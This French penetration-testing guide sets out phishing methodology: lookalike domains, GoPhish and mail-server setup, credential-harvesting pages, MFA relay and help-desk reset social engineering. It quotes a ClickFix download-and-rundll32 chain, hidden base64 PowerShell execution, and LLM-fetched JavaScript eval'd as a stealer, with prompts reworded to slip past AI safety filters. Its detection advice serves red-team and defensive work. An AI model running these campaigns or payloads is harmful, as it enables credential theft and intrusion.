# Méthodologie de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie

1. Recon de la victime
1. Sélectionnez le **victim domain**.
2. Effectuez une enumeration web de base **searching for login portals** utilisées par la victime et **decide** lequel vous allez **impersonate**.
3. Utilisez un peu d'**OSINT** pour **find emails**.
2. Préparez l'environnement
1. **Buy the domain** que vous allez utiliser pour l'évaluation de phishing
2. **Configure the email service** les enregistrements associés (SPF, DMARC, DKIM, rDNS)
3. Configurez le VPS avec **gophish**
3. Préparez la campagne
1. Préparez le **email template**
2. Préparez la **web page** pour voler les credentials
4. Lancez la campagne !

## Générer des noms de domaine similaires ou acheter un domaine de confiance

### Domain Name Variation Techniques

- **Keyword**: Le nom de domaine **contient** un **keyword** important du domaine original (par ex., zelster.com-management.com).
- **hypened subdomain**: Remplacez le **point par un tiret** d'un sous-domaine (par ex., www-zelster.com).
- **New TLD**: Même domaine utilisant un **New TLD** (par ex., zelster.org)
- **Homoglyph**: Il **remplace** une lettre du nom de domaine par des **lettres qui ressemblent** (par ex., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Il **permute deux lettres** dans le nom de domaine (par ex., zelsetr.com).
- **Singularization/Pluralization**: Ajoute ou supprime un “s” à la fin du nom de domaine (par ex., zeltsers.com).
- **Omission**: Il **supprime une** des lettres du nom de domaine (par ex., zelser.com).
- **Repetition:** Il **répète une** des lettres du nom de domaine (par ex., zeltsser.com).
- **Replacement**: Comme homoglyph mais moins discret. Il remplace une des lettres du nom de domaine, peut‑être par une lettre proche sur le clavier (par ex., zektser.com).
- **Subdomained**: Introduire un **point** à l'intérieur du nom de domaine (par ex., ze.lster.com).
- **Insertion**: Il **insère une lettre** dans le nom de domaine (par ex., zerltser.com).
- **Missing dot**: Ajouter le TLD au nom de domaine. (par ex., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Il existe une **possibilité que certains bits stockés ou en communication se retournent automatiquement** à cause de facteurs comme les éruptions solaires, les rayons cosmiques ou des erreurs matérielles.

Appliqué aux requêtes DNS, il est possible que le **domaine reçu par le serveur DNS** ne soit pas le même que le domaine initialement demandé.

Par exemple, une modification d'un seul bit dans le domaine "windows.com" peut le changer en "windnws.com."

Les attaquants peuvent **tirer parti de cela en enregistrant plusieurs domaines bit-flipping** similaires au domaine de la victime. Leur intention est de rediriger des utilisateurs légitimes vers leur propre infrastructure.

Pour plus d'informations, lisez [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Vous pouvez rechercher sur [https://www.expireddomains.net/](https://www.expireddomains.net) un domaine expiré que vous pourriez utiliser.\
Pour vous assurer que le domaine expiré que vous allez acheter **a déjà un bon SEO**, vous pouvez vérifier comment il est catégorisé dans :

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Découverte des Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Pour **découvrir plus** d'adresses email valides ou **vérifier celles** que vous avez déjà trouvées, vous pouvez vérifier si vous pouvez brute-force les serveurs SMTP de la victime. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
De plus, n'oubliez pas que si les utilisateurs utilisent un web portal pour accéder à leurs mails, vous pouvez vérifier s'il est vulnérable à des attaques de username brute force, et exploiter la vulnérabilité si possible.

## Configuring GoPhish

### Installation

Vous pouvez le télécharger depuis [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Téléchargez et décompressez-le dans `/opt/gophish` et exécutez `/opt/gophish/gophish`\
Un mot de passe pour l'utilisateur admin vous sera fourni dans la sortie pour le port 3333. Par conséquent, accédez à ce port et utilisez ces identifiants pour changer le mot de passe admin. Vous devrez peut‑être tunneliser ce port en local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**TLS certificate configuration**

Avant cette étape, vous devez **déjà avoir acheté le domaine** que vous allez utiliser et il doit **pointer** vers l'**IP du VPS** où vous configurez **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuration du mail**

Commencez l'installation : `apt-get install postfix`

Ajoutez ensuite le domaine aux fichiers suivants :

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifiez également les valeurs des variables suivantes dans /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Enfin, modifiez les fichiers **`/etc/hostname`** et **`/etc/mailname`** avec votre nom de domaine et **redémarrez votre VPS.**

Créez maintenant un **enregistrement DNS A** de `mail.<domain>` pointant vers l'**adresse IP** du VPS et un **enregistrement DNS MX** pointant vers `mail.<domain>`

Maintenant, testons l'envoi d'un e-mail :
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuration de Gophish**

Arrêtez l'exécution de gophish et configurons-le.\
Modifiez `/opt/gophish/config.json` comme suit (notez l'utilisation de https) :
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurer le service gophish**

Pour créer le service gophish afin qu'il puisse démarrer automatiquement et être géré comme un service, vous pouvez créer le fichier `/etc/init.d/gophish` avec le contenu suivant :
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Terminez la configuration du service et vérifiez son fonctionnement :
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configuration du serveur de messagerie et du domaine

### Patientez et soyez légitime

Plus un domaine est ancien, moins il est probable qu'il soit considéré comme spam. Vous devriez donc attendre le plus longtemps possible (au moins 1 semaine) avant l'évaluation de phishing. De plus, si vous publiez une page liée à un secteur à bonne réputation, la réputation obtenue sera meilleure.

Notez que, même si vous devez attendre une semaine, vous pouvez terminer la configuration dès maintenant.

### Configurer l'enregistrement DNS inverse (rDNS)

Créez un enregistrement rDNS (PTR) qui résout l'adresse IP du VPS vers le nom de domaine.

### Enregistrement Sender Policy Framework (SPF)

Vous devez **configurer un enregistrement SPF pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement SPF [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Vous pouvez utiliser [https://www.spfwizard.net/](https://www.spfwizard.net) pour générer votre politique SPF (utilisez l'IP de la machine VPS)

![](<../../images/image (1037).png>)

Voici le contenu qui doit être défini dans un enregistrement TXT du domaine :
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Enregistrement DMARC (Domain-based Message Authentication, Reporting & Conformance)

Vous devez **configurer un enregistrement DMARC pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Vous devez créer un nouvel enregistrement DNS TXT pointant le hostname `_dmarc.<domain>` avec le contenu suivant:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Vous devez **configurer un DKIM pour le nouveau domaine**. Si vous ne savez pas ce qu'est un enregistrement DMARC, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ce tutoriel est basé sur : [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Vous devez concaténer les deux valeurs B64 que génère la clé DKIM :
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testez le score de configuration de votre e-mail

Vous pouvez le faire en utilisant [https://www.mail-tester.com/](https://www.mail-tester.com/)\  
Il suffit d'accéder à la page et d'envoyer un e-mail à l'adresse qu'ils vous donnent :
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Vous pouvez aussi **vérifier votre configuration e-mail** en envoyant un e-mail à `check-auth@verifier.port25.com` et en **lisant la réponse** (pour cela vous devrez **ouvrir** le port **25** et consulter la réponse dans le fichier _/var/mail/root_ si vous envoyez l'e-mail en tant que root).\
Vérifiez que vous passez tous les tests :
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Vous pouvez aussi envoyer **un message vers un compte Gmail que vous contrôlez**, et vérifier les **en-têtes de l’email** dans votre boîte Gmail, `dkim=pass` doit être présent dans le champ d’en-tête `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Retirer de la Spamhouse Blacklist

La page [www.mail-tester.com](https://www.mail-tester.com) peut indiquer si votre domaine est bloqué par spamhouse. Vous pouvez demander la suppression de votre domaine/IP à : [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Retirer de la Microsoft Blacklist

Vous pouvez demander la suppression de votre domaine/IP à [https://sender.office.com/](https://sender.office.com).

## Créer et lancer une campagne GoPhish

### Profil d'envoi

- Définissez un **nom pour identifier** le profil d'envoi
- Décidez depuis quel compte vous allez envoyer les emails de phishing. Suggestions : _noreply, support, servicedesk, salesforce..._
- Vous pouvez laisser vides les champs username and password, mais assurez-vous de cocher Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Il est recommandé d'utiliser la fonctionnalité "**Send Test Email**" pour vérifier que tout fonctionne.\
> Je recommande d'**envoyer les emails de test vers des adresses 10min mail** afin d'éviter d'être blacklisté lors des tests.

### Modèle d'email

- Définissez un **nom pour identifier** le modèle
- Ensuite écrivez un **sujet** (rien d'étrange, juste quelque chose qu'on s'attendrait à lire dans un email ordinaire)
- Assurez-vous d'avoir coché "**Add Tracking Image**"
- Rédigez le **modèle d'email** (vous pouvez utiliser des variables comme dans l'exemple suivant) :
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Notez que **pour augmenter la crédibilité de l'email**, il est recommandé d'utiliser une signature provenant d'un email du client. Suggestions :

- Envoyer un email à une **adresse inexistante** et vérifier si la réponse contient une signature.
- Chercher des **emails publics** comme info@ex.com ou press@ex.com ou public@ex.com et leur envoyer un email puis attendre la réponse.
- Tenter de contacter **une adresse valide découverte** et attendre la réponse

![](<../../images/image (80).png>)

> [!TIP]
> Le Email Template permet aussi **d'attacher des fichiers à envoyer**. Si vous souhaitez également voler des challenges NTLM en utilisant des fichiers/documents spécialement conçus, [lisez cette page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Page de destination

- Indiquer un **nom**
- **Écrire le code HTML** de la page web. Notez que vous pouvez **importer** des pages web.
- Cocher **Capture Submitted Data** et **Capture Passwords**
- Définir une **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Généralement vous devrez modifier le code HTML de la page et faire des tests en local (peut‑être en utilisant un serveur Apache) **jusqu'à obtenir le résultat souhaité.** Ensuite, collez ce code HTML dans la zone prévue.\
> Notez que si vous devez **utiliser des ressources statiques** pour le HTML (par exemple des pages CSS et JS) vous pouvez les sauvegarder dans _**/opt/gophish/static/endpoint**_ puis y accéder depuis _**/static/<filename>**_

> [!TIP]
> Pour la redirection vous pouvez **rediriger les utilisateurs vers la page web légitime principale** de la victime, ou les rediriger vers _/static/migration.html_ par exemple, afficher une **roue de chargement (**[**https://loading.io/**](https://loading.io)**) pendant 5 secondes puis indiquer que le processus a réussi**.

### Utilisateurs & Groupes

- Définir un nom
- **Importer les données** (notez que pour utiliser le template de l'exemple vous avez besoin du prénom, du nom et de l'adresse e-mail de chaque utilisateur)

![](<../../images/image (163).png>)

### Campagne

Enfin, créez une campagne en sélectionnant un nom, le template d'email, la landing page, l'URL, le sending profile et le groupe. Notez que l'URL sera le lien envoyé aux victimes

Notez que le **Sending Profile permet d'envoyer un email test pour voir à quoi ressemblera l'email de phishing final** :

![](<../../images/image (192).png>)

> [!TIP]
> Je recommande **d'envoyer les emails de test vers des adresses 10min mails** afin d'éviter d'être blacklisté lors des tests.

Une fois que tout est prêt, lancez simplement la campagne !

## Clonage de site web

Si, pour une raison quelconque, vous voulez cloner le site web consultez la page suivante :


{{#ref}}
clone-a-website.md
{{#endref}}

## Documents & fichiers backdoorés

Dans certaines évaluations de phishing (principalement pour les Red Teams) vous voudrez aussi **envoyer des fichiers contenant une sorte de backdoor** (peut‑être un C2 ou peut‑être simplement quelque chose qui déclenchera une authentification).\
Consultez la page suivante pour des exemples :


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attaque précédente est assez ingénieuse car vous falsifiez un vrai site et collectez les informations saisies par l'utilisateur. Malheureusement, si l'utilisateur n'a pas entré le bon mot de passe ou si l'application que vous avez usurpée est configurée avec 2FA, **ces informations ne vous permettront pas d'usurper l'utilisateur piégé**.

C'est là que des outils comme [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) et [**muraena**](https://github.com/muraenateam/muraena) sont utiles. Cet outil permet de générer une attaque MitM. En gros, l'attaque fonctionne de la manière suivante :

1. Vous **vous faites passer pour le formulaire de login** de la vraie page web.
2. L'utilisateur **envoie** ses **identifiants** à votre page factice et l'outil les relaie vers la vraie page web, **vérifiant si les identifiants fonctionnent**.
3. Si le compte est configuré avec **2FA**, la page MitM demandera la 2FA et une fois que **l'utilisateur la saisit** l'outil la transmettra à la vraie page.
4. Une fois l'utilisateur authentifié vous (en tant qu'attaquant) aurez **capturé les identifiants, la 2FA, le cookie et toute information** de chaque interaction pendant que l'outil effectue le MitM.

### Via VNC

Et si, au lieu d'**envoyer la victime vers une page malveillante** qui ressemble à l'originale, vous l'envoyiez vers une **session VNC avec un navigateur connecté à la vraie page web** ? Vous pourrez voir ce qu'elle fait, voler le mot de passe, la MFA utilisée, les cookies...\
Vous pouvez faire cela avec [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Détecter la détection

Évidemment, l'une des meilleures façons de savoir si vous avez été repéré est de **chercher votre domaine dans les blacklists**. S'il apparaît listé, d'une manière ou d'une autre votre domaine a été détecté comme suspect.\
Un moyen simple de vérifier si votre domaine figure dans une blacklist est d'utiliser [https://malwareworld.com/](https://malwareworld.com)

Cependant, il existe d'autres façons de savoir si la victime **cherche activement des activités de phishing suspectes** dans la nature comme expliqué dans :


{{#ref}}
detecting-phising.md
{{#endref}}

Vous pouvez **acheter un domaine au nom très similaire** à celui de la victime **et/ou générer un certificat** pour un **sous-domaine** d'un domaine contrôlé par vous **contenant** le **mot-clé** du domaine de la victime. Si la **victime** effectue une quelconque interaction **DNS ou HTTP** avec eux, vous saurez qu'**elle recherche activement** des domaines suspects et vous devrez être très discret.

### Évaluer le phishing

Utilisez [**Phishious** ](https://github.com/Rices/Phishious) pour évaluer si votre email va finir dans le dossier spam, s'il sera bloqué ou s'il sera efficace.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Les campagnes d'intrusion modernes évitent de plus en plus les leurres par email et **ciblent directement le service d'assistance / le workflow de récupération d'identité** pour contourner la MFA. L'attaque est entièrement « living-off-the-land » : une fois que l'opérateur possède des identifiants valides il pivote avec les outils d'admin intégrés – aucun malware n'est nécessaire.

### Flux d'attaque
1. Recon sur la victime
* Récupérer des informations personnelles & d'entreprise depuis LinkedIn, fuites de données, GitHub public, etc.
* Identifier des identités à forte valeur (cadres, IT, finance) et énumérer le **processus exact du help-desk** pour le reset de mot de passe / MFA.
2. Social engineering en temps réel
* Appeler, contacter via Teams ou chat le help-desk en se faisant passer pour la cible (souvent avec **caller-ID usurpé** ou **voix clonée**).
* Fournir les PII collectées précédemment pour passer la vérification basée sur les connaissances.
* Convaincre l'agent de **réinitialiser le secret MFA** ou d'effectuer un **SIM-swap** sur un numéro mobile enregistré.
3. Actions immédiates après accès (≤60 min dans des cas réels)
* Établir un point d'appui via n'importe quel portail web SSO.
* Énumérer AD / AzureAD avec les outils intégrés (aucun binaire déployé) :
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Mouvement latéral avec **WMI**, **PsExec**, ou des agents légitimes **RMM** déjà whitelistés dans l'environnement.

### Détection & Atténuation
* Traiter la récupération d'identité via le help-desk comme une **opération privilégiée** – exiger une authentification renforcée & l'approbation du manager.
* Déployer des règles **Identity Threat Detection & Response (ITDR)** / **UEBA** qui alertent sur :
* Méthode MFA changée + authentification depuis un nouvel appareil / une nouvelle géolocalisation.
* Élévation immédiate du même principal (user → admin).
* Enregistrer les appels au help-desk et imposer un **rappel vers un numéro déjà enregistré** avant toute réinitialisation.
* Implémenter **Just-In-Time (JIT) / Privileged Access** pour que les comptes nouvellement réinitialisés **n'héritent pas automatiquement** de tokens hautement privilégiés.

---

## Tromperie à grande échelle – SEO Poisoning & campagnes “ClickFix”
Les groupes à volume compensent le coût des opérations high-touch par des attaques massives qui transforment **les moteurs de recherche & les réseaux publicitaires en canal de livraison**.

1. **SEO poisoning / malvertising** pousse un résultat factice comme `chromium-update[.]site` en tête des annonces de recherche.
2. La victime télécharge un petit **first-stage loader** (souvent JS/HTA/ISO). Exemples observés par Unit 42 :
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Le loader exfiltre les cookies du navigateur + les DB d'identifiants, puis télécharge un **silent loader** qui décide – *en temps réel* – s'il doit déployer :
* RAT (par ex. AsyncRAT, RustDesk)
* ransomware / wiper
* composant de persistance (clé Run du registre + tâche planifiée)

### Conseils de durcissement
* Bloquer les domaines nouvellement enregistrés & appliquer un **Advanced DNS / URL Filtering** sur les *search-ads* ainsi que sur les emails.
* Restreindre l'installation de logiciels aux packages MSI signés / Store, interdire l'exécution `HTA`, `ISO`, `VBS` par politique.
* Surveiller les processus enfants des navigateurs qui lancent des installateurs :
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Chasser les LOLBins fréquemment abusés par les first-stage loaders (par ex. `regsvr32`, `curl`, `mshta`).

### Technique de livraison DLL ClickFix (fausse mise à jour CERT)
* Leurres : avis du CERT cloné avec un bouton **Update** affichant des instructions « fix » pas à pas. Les victimes sont invitées à exécuter un batch qui télécharge une DLL et l'exécute via `rundll32`.
* Chaîne de batch typique observée :
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` dépose le payload dans `%TEMP%`, une courte pause masque les variations réseau, puis `rundll32` appelle le point d'entrée exporté (`notepad`).
* La DLL beacon l'identité de l'hôte et interroge le C2 toutes les quelques minutes. Les tâches distantes arrivent sous forme de **PowerShell encodé en base64** exécuté en mode caché et avec contournement de politique :
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Cela préserve la flexibilité du C2 (le serveur peut changer les tâches sans mettre à jour la DLL) et masque les fenêtres de console. Chasser les PowerShell enfants de `rundll32.exe` utilisant `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` ensemble.
* Les défenseurs peuvent rechercher des callbacks HTTP(S) du type `...page.php?tynor=<COMPUTER>sss<USER>` et des intervalles de polling de 5 minutes après le chargement de la DLL.

---

## Opérations de phishing améliorées par l'IA
Les attaquants enchaînent désormais des **APIs LLM & voice-clone** pour des leurres entièrement personnalisés et une interaction en temps réel.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automatisation|Générer & envoyer >100 k emails / SMS avec formulations aléatoires & liens trackés.|
|IA générative|Produire des emails *one-off* faisant référence à des fusions publiques, des private jokes issues des réseaux sociaux ; voix deepfake du CEO lors d'un appel.|
|IA agentive|Enregistrer automatiquement des domaines, scraper l'OSINT, rédiger des emails de l'étape suivante quand une victime clique mais ne soumet pas ses identifiants.|

**Défense :**
• Ajouter des **bannières dynamiques** signalant les messages envoyés par des automatisations non fiables (via anomalies ARC/DKIM).  
• Déployer des **phrases de challenge biométriques vocales** pour les demandes téléphoniques à haut risque.  
• Simuler en continu des leurres générés par IA dans les programmes de sensibilisation – les templates statiques sont obsolètes.

Voir aussi – abuse d'agent agentic pour le credential phishing :

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Voir aussi – abus d'agent IA des outils CLI locaux et MCP (pour inventaire des secrets et détection) :

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblage à l'exécution de JavaScript de phishing assisté par LLM (génération de code côté navigateur)

Les attaquants peuvent livrer un HTML d'apparence bénigne et **générer le stealer à l'exécution** en interrogeant une **API LLM de confiance** pour obtenir du JavaScript, puis l'exécuter dans le navigateur (par ex., `eval` ou un `<script>` dynamique).

1. **Prompt-comme-obfuscation :** encoder des URLs d'exfil / chaînes Base64 dans le prompt ; itérer le wording pour contourner les filtres de sécurité et réduire les hallucinations.
2. **Appel client-side à l'API :** au chargement, le JS appelle un LLM public (Gemini/DeepSeek/etc.) ou un proxy CDN ; seul le prompt/l'appel API est présent dans le HTML statique.
3. **Assembler & exécuter :** concaténer la réponse et l'exécuter (polymorphe par visite) :
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** le code généré personnalise le leurre (p.ex., LogoKit token parsing) et envoie des creds au prompt-hidden endpoint.

**Evasion traits**
- Le trafic cible des domaines LLM bien connus ou des proxies CDN réputés ; parfois via WebSockets vers un backend.
- Pas de payload statique ; le JS malveillant n'existe qu'après le rendu.
- Des générations non déterministes produisent des stealers **uniques** par session.

**Detection ideas**
- Exécuter des sandboxes avec JS activé ; signaler **runtime `eval`/création dynamique de scripts provenant des réponses LLM**.
- Traquer des POSTs front-end vers des LLM APIs immédiatement suivis d'un `eval`/`Function` sur le texte retourné.
- Alerter sur des domaines LLM non sanctionnés dans le trafic client, ainsi que des credential POSTs ultérieurs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Outre le push-bombing classique, les opérateurs **forcent un nouvel enregistrement MFA** pendant l'appel au service d'assistance, annulant le token existant de l'utilisateur. Toute invite de connexion ultérieure paraît légitime pour la victime.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Surveillez les événements AzureAD/AWS/Okta où **`deleteMFA` + `addMFA`** se produisent **à quelques minutes d'intervalle depuis la même IP**.



## Clipboard Hijacking / Pastejacking

Les attaquants peuvent copier silencieusement des commandes malveillantes dans le clipboard de la victime depuis une page web compromise ou typosquattée, puis inciter l'utilisateur à les coller dans **Win + R**, **Win + X** ou une fenêtre de terminal, exécutant du code arbitraire sans aucun téléchargement ni pièce jointe.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* L'APK intègre des identifiants statiques et des “unlock codes” par profil (pas d'authentification serveur). Les victimes suivent un faux flow d'exclusivité (login → locked profiles → unlock) et, si les codes sont corrects, sont redirigées vers des chats WhatsApp avec des numéros `+92` contrôlés par l'attaquant pendant que le spyware s'exécute en silence.
* La collecte commence même avant la connexion : exfil immédiate du **device ID**, des contacts (en `.txt` depuis le cache) et des documents (images/PDF/Office/OpenXML). Un content observer téléverse automatiquement les nouvelles photos ; une tâche planifiée rescanne les nouveaux documents toutes les **5 minutes**.
* Persistance : s'enregistre pour `BOOT_COMPLETED` et maintient un **foreground service** actif pour survivre aux redémarrages et aux évictions en arrière-plan.

### WhatsApp device-linking hijack via QR social engineering
* Une page d'appât (p.ex. un faux ministère/CERT “channel”) affiche un QR WhatsApp Web/Desktop et demande à la victime de le scanner, ajoutant silencieusement l'attaquant comme **linked device**.
* L'attaquant obtient immédiatement visibilité sur les chats/contacts tant que la session n'est pas supprimée. Les victimes peuvent plus tard voir une notification “new device linked” ; les défenseurs peuvent rechercher des événements inattendus de liaison d'appareil peu après des visites de pages QR non fiables.

### Mobile‑gated phishing to evade crawlers/sandboxes
Les opérateurs cloisonnent de plus en plus leurs phishing flows derrière un simple contrôle de l'appareil pour que les desktop crawlers n'atteignent jamais les pages finales. Un pattern courant est un petit script qui teste si le DOM supporte le tactile et poste le résultat à un endpoint serveur ; les clients non‑mobile reçoivent un HTTP 500 (ou une page vide), tandis que les utilisateurs mobiles reçoivent le flow complet.

Extrait client minimal (logique typique) :
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logique (simplifiée) :
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportement du serveur souvent observé :
- Définit un session cookie lors du premier chargement.
- Accepte `POST /detect {"is_mobile":true|false}`.
- Renvoie 500 (ou un placeholder) aux GETs suivants lorsque `is_mobile=false` ; sert le phishing uniquement si `true`.

Heuristiques de chasse et de détection :
- Requête urlscan: `filename:"detect_device.js" AND page.status:500`
